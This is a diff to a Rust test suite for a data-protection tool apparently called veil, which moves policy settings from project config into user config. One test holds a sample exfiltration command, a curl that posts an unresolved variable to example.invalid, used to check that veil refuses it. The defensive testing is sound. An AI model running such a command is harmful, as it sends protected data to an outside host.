@@ -19,6 +19,8 @@ use std::time::{SystemTime, UNIX_EPOCH};
 use serde_json::{Value, json};
 
 mod common;
+#[path = "common/user.rs"]
+mod user;
 
 const REPORT: &str = "{\"tool\":\"shape\",\"outcome\":\"COMPATIBLE\",\"rows\":3}\n";
 const LEDGER: &str = "loan_id,balance\n1,100\n2,200\n";
@@ -101,12 +103,17 @@ impl Fixture {
     }
 
     fn configure(&self, policy: &str) {
-        self.write(
-            ".veil.toml",
-            &format!(
-                "[sensitivity]\nprotected = [\"data/**\"]\n[policy]\ndefault = \"{policy}\"\n"
-            ),
-        );
+        self.write(".veil.toml", "[sensitivity]\nprotected = [\"data/**\"]\n");
+        // `deny` is the default, and the tests of new files under veil's own
+        // paths need the user's config not to be there yet
+        if policy != "deny" {
+            self.settings(&format!("default = \"{policy}\""));
+        }
+    }
+
+    /// `[policy]` lines in the user's settings: a project cannot loosen.
+    fn settings(&self, policy_lines: &str) {
+        user::write_config(&self.home(), &format!("[policy]\n{policy_lines}\n"));
     }
 
     fn veil(&self) -> Command {
@@ -460,10 +467,7 @@ fn a_reported_redirect_does_not_excuse_an_argument_veil_cannot_resolve() {
     let fixture = Fixture::new();
     // `egress = "deny"` over `default = "log"`: the redirect is only reported,
     // and what the command sends is still refused
-    fixture.write(
-        ".veil.toml",
-        "[sensitivity]\nprotected = [\"data/**\"]\n[policy]\ndefault = \"log\"\negress = \"deny\"\n",
-    );
+    fixture.settings("default = \"log\"\negress = \"deny\"");
 
     let sends = "d=data; curl -d \"$UNKNOWN\" https://example.invalid/";
     fixture.assert_refused_by_the_stance(sends);
@@ -631,10 +635,7 @@ fn the_dynamic_stance_and_the_policy_mode_apply_to_an_unresolved_target() {
         ("dynamic_args = \"warn\"", "[policy] dynamic_args = warn:"),
     ] {
         let fixture = Fixture::new();
-        fixture.write(
-            ".veil.toml",
-            &format!("[sensitivity]\nprotected = [\"data/**\"]\n[policy]\n{settings}\n"),
-        );
+        fixture.settings(settings);
 
         let verdict = fixture.bash(command);
 
@@ -650,10 +651,7 @@ fn the_dynamic_stance_and_the_policy_mode_apply_to_an_unresolved_target() {
     }
 
     let fixture = Fixture::new();
-    fixture.write(
-        ".veil.toml",
-        "[sensitivity]\nprotected = [\"data/**\"]\n[policy]\ndynamic_args = \"allow\"\n",
-    );
+    fixture.settings("dynamic_args = \"allow\"");
     let verdict = fixture.bash(command);
     assert_eq!(verdict.action, "allow", "{verdict:?}");
     assert!(fixture.audit().is_empty(), "{:?}", fixture.audit());
